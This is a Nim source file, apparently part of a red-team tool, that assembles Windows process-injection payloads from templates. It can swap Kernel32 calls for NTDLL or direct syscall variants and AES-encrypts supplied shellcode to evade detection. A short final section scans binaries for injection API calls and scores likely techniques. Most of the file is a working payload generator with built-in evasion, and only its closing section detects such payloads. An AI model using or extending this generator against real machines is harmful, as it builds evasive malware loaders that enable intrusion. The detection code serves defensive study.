import yaml/serialization, streams
import terminal, strutils, strformat, sequtils, random
import nimcrypto
import nimcrypto/sysrand
import sugar

type Technique = object
  name: string
  api_calls: seq[string]

type ApiCall = object
  api_call: string
  fn_template: string

type Arguments = object 
  name: string
  calls: seq[ApiCall]

type InitSetup = object
  name: string
  setup: seq[string]

type Modules = object
  name: string 
  modules: seq[string]

type NtdllCalls = object
  name: string 
  ntdll: string

type Syscalls = object
  name: string 
  syscall_hex: string

type Info = object
  name: string
  info: string

proc info_setup(file_name: string): seq[Info] =
  var infoSetup: seq[Info]
  var s = newFileStream(file_name)
  load(s, infoSetup)
  s.close()

  return infoSetup 

proc init_setup(file_name: string): seq[InitSetup] =
  var initSetup: seq[InitSetup]
  var s = newFileStream(file_name)
  load(s, initSetup)
  s.close()

  return initSetup

proc module_setup(file_name: string): seq[Modules] =
  var moduleSetup: seq[Modules]
  var s = newFileStream(file_name)
  load(s, moduleSetup)
  s.close()

  return moduleSetup 

proc ntdll_setup(file_name: string): seq[NtdllCalls] =
  var ntdllSetup: seq[NtdllCalls]
  var s = newFileStream(file_name)
  load(s, ntdllSetup)
  s.close()

  return ntdllSetup

proc syscall_setup(file_name: string): seq[Syscalls] =
  var syscallSetup: seq[Syscalls]
  var s = newFileStream(file_name)
  load(s, syscallSetup)
  s.close()

  return syscallSetup 

proc get_techniques(file_name: string): seq[Technique] =
  var techniqueList: seq[Technique]
  var s = newFileStream(file_name)
  load(s, techniqueList)
  s.close()

  return techniqueList

proc custom_arguments(file_name: string): seq[Arguments] = 
  var customArguments: seq[Arguments]
  var s = newFileStream(file_name)
  load(s, customArguments)
  s.close()

  return customArguments

proc get_all_techniques(technique_list: seq[Technique]): seq[string] =
  var all_techniques = newSeq[string]()
  for i in technique_list:
    all_techniques.add(i.name)

  return all_techniques

proc get_calls(technique_list: seq[Technique], technique: string): seq[string] = 
  for i in technique_list:
    if i.name == technique:
      return i.api_calls

proc get_arguments(argument_list: seq[Arguments], technique: string): seq[ApiCall] = 
  for i in argument_list:
    if i.name == technique:
      return i.calls

proc colored_print(to_print: string, color: ForegroundColor): void = 
  setForegroundColor(color)
  echo to_print
  setForegroundColor(fgWhite)

proc print_info(info_list: seq[Info], technique: string): void = 
  var count = 0
  for i in info_list:
    if i.name == technique and i.info != "":
      colored_print(fmt"[!] {i.info}", fgYellow)
      count += 1
  if count == 0:
    colored_print(fmt"[-] No information found - {technique}", fgRed)

proc indent_lines(lines: string, indent: int, ignore_first: bool): string = 
  var indented = newSeq[string]()
  var count = 0

  for i in lines.split("\n"):
    if count == 0 and ignore_first:
      indented.add(i)
      count += 1
      continue
    indented.add(" ".repeat(indent) & i)

  return join(indented, "\n")

proc get_modules(technique: string, variation: string, shellcode_type: string): string = 
  var modules = newseq[string]()
  modules.add("import base64")
  modules.add("import winim")
  modules.add("import winim/lean")

  if shellcode_type == "true":
    modules.add("import nimcrypto")

  if variation == "syscalls":
    modules.add("include utils/syscalls")

  if variation == "gstub":
    modules.add("import osproc")
    modules.add("include utils/GetSyscallStub")
 
  let module_list = module_setup("models/modules.yml")
  for i in module_list:
    if i.name == technique:
      for j in i.modules:
        modules.add(j)

  return join(modules, "\n")

proc k32_to_nt(call: string, ntdll_calls: seq[NtdllCalls]): string = 
  for i in ntdll_calls:
    if i.name == call:
      return i.ntdll
  return call

proc nt_to_syscall(call: string, syscalls: seq[Syscalls]): string = 
  for i in syscalls:
    if i.name == call:
      return i.syscall_hex
  return ""

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

proc get_shellcode_template(sc_format: string, shellcode: string): string =
  var shellcode_template = readFile("templates/vanilla_shellcode.nim")
  if sc_format == "false":
    shellcode_template = shellcode_template.replace("REPLACE_SHELLCODE", shellcode) 
    return indent_lines(shellcode_template, 2, true)

  shellcode_template = readFile("templates/encrypted_shellcode.nim")

  var
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    data: seq[byte] = toByteSeq(decode(shellcode))
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

  let chars = {'a'..'z','A'..'Z'}
  randomize()
  var envkey = collect(newSeq, (for i in 0..<32: chars.sample)).join
  
  discard randomBytes(addr iv[0], 16)
  copyMem(addr plaintext[0], addr data[0], len(data))

  var expandedkey = sha256.digest(envkey)
  copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
 
  var ectx: CTR[aes256] 
  ectx.init(key, iv)
  ectx.encrypt(plaintext, enctext)
  ectx.clear()
  
  shellcode_template = shellcode_template.replace("REPLACE_PASS", envkey)
  shellcode_template = shellcode_template.replace("REPLACE_IV", encode(iv))
  shellcode_template = shellcode_template.replace("REPLACE_ENC", encode(enctext))
  
  return indent_lines(shellcode_template, 2, true)
 
proc get_init_setup(technique: string, technique_list: seq, variation: string): string = 
  let setup_list = init_setup("models/init_setup.yml")
  let ntdll_calls = ntdll_setup("models/k32_to_nt.yml")
  let calls = get_calls(technique_list, technique)

  var setup_contents: string
  var combined_setup = newSeq[string]()

  for i in setup_list:
    if i.name == technique:
      for j in i.setup:
        setup_contents = readFile(fmt"inits/{j}.nim")
        combined_setup.add(setup_contents)
  
  if variation == "ntdll":
    for i in calls:
      var api_call = i.split(" - ")[0] 
      var temp = k32_to_nt(api_call, ntdll_calls)
      if api_call != temp:
        setup_contents = readFile(fmt"inits/{temp}.nim")
        combined_setup.add(setup_contents)

  if variation == "gstub":
    for i in calls:
      var api_call = i.split(" - ")[0] 
      var temp = k32_to_nt(api_call, ntdll_calls)
      if api_call != temp:
        setup_contents = readFile(fmt"inits/gstub{temp}.nim")
        combined_setup.add(setup_contents)
  
  return join(combined_setup, "\n")

proc get_gstub_init(calls: seq[string], ntdll_calls: seq[NtdllCalls]): string =
  var gstub_init = newSeq[string]()
  var gstub_call_init = readFile("inits/gstubInit.nim")
  var gstub_call_template = readFile("inits/gstubCall.nim")
  var gstub_offset_template = readFile("inits/gstubOffset.nim")
  var temp_template = ""
  
  gstub_init.add(gstub_call_init) 
  
  var count = 1
  var prev = 0
  for call in calls:
    var api_call = call.split(" - ")[0] 
    var temp = k32_to_nt(api_call, ntdll_calls)
    if api_call != temp:
      if count != 1:
         temp_template = gstub_offset_template.replace("REPLACE_COUNT", intToStr(count))
         temp_template = temp_template.replace("REPLACE_PREV", intToStr(prev))
         gstub_init.add(temp_template)
         
      temp_template = gstub_call_template.replace("REPLACE_API_CALL", temp)
      temp_template = temp_template.replace("REPLACE_COUNT", intToStr(count))
      gstub_init.add(temp_template)
      
      prev = count
      count += 1

  gstubInit.add("\n")
  return join(gstubInit, "\n")

proc build_template(technique: string, technique_list: seq, variation: string): string = 
  let argument_list = custom_arguments("models/custom_arguments.yml")
  let ntdll_calls = ntdll_setup("models/k32_to_nt.yml")
  let infos = info_setup("models/info.yml")

  let ntdll_variations = @["ntdll", "syscalls", "gstub"]
  
  let calls = get_calls(technique_list, technique)
  let arguments = get_arguments(argument_list, technique)
  var payload_template = readFile("templates/base_exe.nim")
  var api_template = newSeq[string]()
  var checker = newSeq[string]()
  var content: string = ""

  # Initialize res var if ntdll / syscall / gstub
  if contains(ntdll_variations, variation):
    api_template.add("var res: WINBOOL\n")

  # Initialize if gstub
  if variation == "gstub":
    var gstub_init = get_gstub_init(calls, ntdll_calls)
    api_template.add(gstub_init)
    
  # Setup API calls
  for call in calls:
    var temp = call.split(" - ")[0]
    var api_call = temp
    if contains(ntdll_variations, variation): 
      api_call = k32_to_nt(api_call, ntdll_calls)
    
      if api_call != temp:
        colored_print(fmt"[-] Converted {temp} into {api_call}", fgGreen)
      else:
        colored_print(fmt"[-] No NT API call for {temp}", fgYellow)

    content = ""
    for custom_arg in arguments:
      if custom_arg.api_call == api_call:
        content = readFile(fmt"custom/{custom_arg.fn_template}.nim")
        if not checker.contains(content):
          checker.add(content)
          colored_print(fmt"[+] API call used: {api_call}", fgGreen)
          print_info(infos, api_call)
          break

    if content == "":      
      content = readFile(fmt"functions/{api_call}.nim")
      colored_print(fmt"[+] API call used: {api_call}", fgGreen)
      print_info(infos, api_call)
      checker.add(content)
    api_template.add(content)

  var compiled_api = join(api_template, "")
  compiled_api = indent_lines(compiled_api, 2, false)
  
  payload_template = payload_template.replace("REPLACE_TECHNIQUE_NAME", technique)
  payload_template = payload_template.replace("REPLACE_API_CALLS", compiled_api)
  
  return payload_template

# Blue Team Capabilities 

proc process_binary(binary: string, technique_list: seq): void = 
  let bin = readFile(binary).replace('\x00', ' ')
  let ntdll_calls = ntdll_setup("models/k32_to_nt.yml")
  let syscalls = syscall_setup("models/syscalls.yml")
  let infos = info_setup("models/info.yml")

  for i in technique_list:
    var 
      count: int = 0
      res: int
      total: int = len(i.api_calls)
      api_calls = deduplicate(i.api_calls)
  
    colored_print(fmt"[+] Checking API calls used by {i.name}.", fgGreen)
    for call in api_calls:
      var temp = call.split(" - ")
      var api_call = temp[0]
      var weight = 1
      var nt_call = k32_to_nt(api_call, ntdll_calls)
      var syscall = nt_to_syscall(nt_call, syscalls)
      var bin_to_hex = toHex(bin)
      
      # Weight computation
      if len(temp) == 2:
        weight = parseInt(temp[1])
        total = total - 1 + weight

      # NTDLL detection
      if bin_to_hex.contains(syscall) and syscall != "":
        count += weight
        colored_print(fmt"[-] Detected NTDLL API call syscalls: {nt_call}", fgYellow)
        print_info(infos, nt_call)
          
      elif bin.contains(nt_call) and nt_call != "":
        count += weight
        colored_print(fmt"[-] Detected NTDLL API call via strings: {nt_call}", fgYellow)
        print_info(infos, nt_call)
    
      # Kernel32 detection
      elif bin.contains(api_call):
        count += weight
        colored_print(fmt"[-] Detected Kernel32 API call via strings: {api_call}", fgYellow)
        print_info(infos, api_call)
      
    res = int((count / total) * 100)
    if res >= 50:
      colored_print(fmt"[!] Potential Injection Technique: {i.name} - {res}%", fgRed)
